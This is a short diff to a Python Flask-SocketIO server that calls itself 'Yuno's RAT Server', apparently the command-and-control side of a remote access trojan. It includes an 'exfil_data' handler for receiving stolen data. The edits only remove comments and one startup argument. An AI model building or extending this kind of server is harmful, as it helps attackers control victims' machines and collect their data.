@@ -123,7 +123,7 @@ def handle_connect():
     connected_clients.add(client_id)
     print(f"[*] Client connected: {client_id}")
     emit('client_update', list(connected_clients), broadcast=True)
-    emit('request_client_info', broadcast=True)  # Added to request client info on connect
+    emit('request_client_info', broadcast=True)
 
 @socketio.on('disconnect')
 def handle_disconnect():
@@ -134,7 +134,7 @@ def handle_disconnect():
         client_info.pop(client_id, None)
         print(f"[*] Client disconnected: {client_id}")
         emit('client_update', list(connected_clients), broadcast=True)
-        emit('request_client_info', broadcast=True)  # Added to update client info on disconnect
+        emit('request_client_info', broadcast=True)
 
 @socketio.on('exfil_data')
 def handle_exfil_data(sid, data):
@@ -214,4 +214,4 @@ def handle_request_client_info(sid):
 if __name__ == "__main__":
     print("=== Yuno's RAT Server ===")
     print("A remote access server by Yuno\n")
-    socketio.run(app, host='0.0.0.0', port=5000, debug=True,allow_unsafe_werkzeug=True)
+    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
